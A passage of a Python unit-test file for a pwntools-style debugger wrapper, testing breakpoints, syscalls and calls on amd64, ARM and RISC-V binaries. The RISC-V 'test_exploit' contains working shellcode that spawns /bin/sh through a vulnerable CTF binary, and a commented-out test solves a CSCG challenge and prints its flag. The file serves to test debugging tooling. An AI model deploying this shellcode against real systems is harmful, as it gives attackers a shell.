        out = []
        with context.local(arch="amd64", bits=64):
            with Debugger("./cube", aslr=False, debug_from=0x55555555950a) as dbg: # You must wait for the libc to be loaded to call malloc
                dbg.migrate(libdebug=True)
                address = dbg.call("malloc", [0x100])
                self.assertEqual(address, 0x55555555d2a0)
                self.assertFalse(dbg.priority)
            
    # BROKEN !!!!!
    """#@unittest.skip
    @timeout_decorator.timeout(LONG)
    def test_inner_debugger(self):	
        print("\ntest_inner_debugger [libdebug]:")	
        from sage.all import IntegerModRing, MatrixSpace, vector

        END_ANTI_TRACING = 0x0401590
        PTRACE_CONT = 0x0401775
        RWX_SECTION = 0x7ffff7ff8000
        END_UNPACK  = RWX_SECTION + 0x80
        TRAP_PTRACE = RWX_SECTION + 0x9e
        MATRIX_DATA = RWX_SECTION + 0xc2

        def parse_line(data: bytes):
            ans = []
            for i in range(0, 0x10):
                ans.append(u32(data[i*4: (i+1)*4]))
            return ans

        with context.local(binary = ELF("./traps_withSymbols")):
            dbg = Debugger("./traps_withSymbols", aslr=False, debug_from=END_ANTI_TRACING)
            dbg.next()
            child_pid = dbg.return_value
            # Wait for parent to attach
            dbg.continue_until("waitpid")
            dbg.finish()

            dbg.migrate(libdebug=True)
            child = Inner_Debugger(dbg, child_pid)

            dbg.p.sendline(b"A"*0x40)
            A, b = [], []
            for i in range(1, 21):
                if i <= 4:
                    print(i)
                    dbg.continue_until(PTRACE_CONT, loop=True)
                child.continue_until(END_UNPACK, loop=True)
                if i == 4:
                    child.continue_until(TRAP_PTRACE)
                    child.step()
                    child.return_value = 0x0
                if i in range(5, 5+0x10):
                    A.append(parse_line(child.read(MATRIX_DATA, 0x40)))
                    b.append(u32(child.read(MATRIX_DATA+ 0x40, 4)))
            R = IntegerModRing(2**32)
            M = MatrixSpace(R, 0x10, 0x10)
            A = M(A)
            b = vector(b)
            x = A.solve_right(b)
            flag = b""
            for n in x:
                flag += p32(n)
            flag = xor(flag, 0xd)
            self.assertEqual(flag, b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")
            self.assertFalse(dbg.priority)
            dbg.close()
    """

#@unittest.skip
class Debugger_ARM(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_continue_until(self):
        with context.local(arch="aarch64"):
            with Debugger("./run_prog_with_symbols", script=gdbinit_pwndbg) as dbg:
                print("\ntest_continue_until [ARM]: ", end="")
                dbg.continue_until("main")
                self.assertEqual(dbg.instruction_pointer, 0x23baf8)
                self.assertFalse(dbg.priority)
        
    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_syscall(self):
        print("\ntest_syscall [ARM]: ", end="")
        with context.local(arch="aarch64"):
            with Debugger("./run_prog_with_symbols", script=gdbinit_pwndbg) as dbg:
                path = "./data.txt"
                with open(path, "wb") as file:
                    file.write(b"") 
                dbg.until("main") # Get a decent stack
                fd = dbg.syscall(constants.SYS_openat, [constants.AT_FDCWD, path, constants.O_WRONLY, 0x0])
                data = b"ciao, come stai ?"
                dbg.syscall(constants.SYS_write, [fd, data, len(data)])
                dbg.syscall(constants.SYS_close, [fd])
                with open(path, "rb") as file:
                    self.assertEqual(file.read(), data)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_call(self):
        print("\ntest_call [ARM]: ", end="")
        out = []
        with context.local(arch="aarch64"):
            with Debugger("./test_arm_call", script=gdbinit_pwndbg) as dbg:
                dbg.until("main") # get a decent stack frame
                for i in [3, 6, 1]:
                    dbg.call("forkexample", [i])
                    self.assertEqual(dbg.p.recvline(), f"{i}\n".encode())
                dbg.c()
                self.assertEqual(dbg.p.recvline(), b"all done!\n")
                self.assertFalse(dbg.priority)

#@unittest.skip
class Debugger_RISCV(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter("ignore", ResourceWarning)
        warnings.simplefilter("ignore", ImportWarning)

    def tearDown(self):
        pass

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_continue_until(self):
        with context.local(binary="./smash-baby"):
            with Debugger("./smash-baby", env={"FLAG":"flag{test}"}, script=gdbinit_pwndbg) as dbg:
                print("\ntest_continue_until [RISCV]: ", end="")
                dbg.continue_until("open")
                self.assertEqual(dbg.instruction_pointer, 0x1ce38)
                self.assertFalse(dbg.priority)
        
    #@unittest.skip
    @timeout_decorator.timeout(MEDIUM)
    def test_syscall(self):
        print("\ntest_syscall [RISCV]: ", end="")
        with context.local(binary="./smash-baby"):
            with Debugger("./smash-baby", env={"FLAG":"flag{test}"}, script=gdbinit_pwndbg) as dbg:
                dbg.until("main") # You must wait for the libc to be loaded to call malloc
                data = b"ciao, come stai ?\n"
                length = dbg.syscall(0x40, [0x1, data, len(data)])
                self.assertEqual(len(data), length)
                self.assertEqual(dbg.p.recv(), data)
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_call(self):
        print("\ntest_call [RISCV]: ", end="")
        out = []
        with context.local(binary="./smash-baby"):
            with Debugger("./smash-baby", script=gdbinit_pwndbg) as dbg:
                dbg.until("main")
                dbg.call("puts", [b"ciao"])
                self.assertEqual(b"ciao\n", dbg.p.recv())
                self.assertFalse(dbg.priority)

    #@unittest.skip
    @timeout_decorator.timeout(QUICK)
    def test_exploit(self):
        print("\ntest_exploit [RISCV]: ", end="")
        out = []
        with context.local(binary="./risky-business"):
            with Debugger(context.binary, script=gdbinit_pwndbg) as dbg:
                
                shellcode = asm("""
                lui a5, 0x6e696
                addi a5, a5, 559
                sd a5, -32(sp)
                lui a5, 0x10687
                xor a6, a6, a6
                addi a6, a6, 1
                slli a6, a6, 0x1c
                sub a5, a5, a6
                addi a5, a5, 815
                sd a5, -28(sp)
                addi a5, sp, -32
                li a2, 0
                li a1, 0
                mv a0, a5
                li t1, 13   
                li  t0, 17     
                mul a7, t0, t1 
                addi a3, a7, 115 - 221
                sb a3, -260(sp)
                addi a3, sp, -258
                jr -2(a3)
                """)

                def extend_read(dbg):
                    size = dbg.args[1]
                    if len(shellcode) >= size:
                        log.warn(f"Your shellcode is still too long! {len(shellcode)}/{size - 1}")
                        dbg.args[1] = len(shellcode) + 1
                    return False
                dbg.b("fgets", callback=extend_read)

                CALL_SHELLCODE = 0x896
                done = dbg.until(CALL_SHELLCODE, wait=False)
                dbg.p.sendline(shellcode)

                done.wait()
                dbg.until(dbg.sp - 260, hw=True)
                self.assertEqual(dbg.next_inst.mnemonic, "ecall")
                self.assertEqual(dbg.read_string(dbg.syscall_args[0]), b"/bin/sh")

if __name__ == "__main__":
    with context.quiet:
        unittest.main()
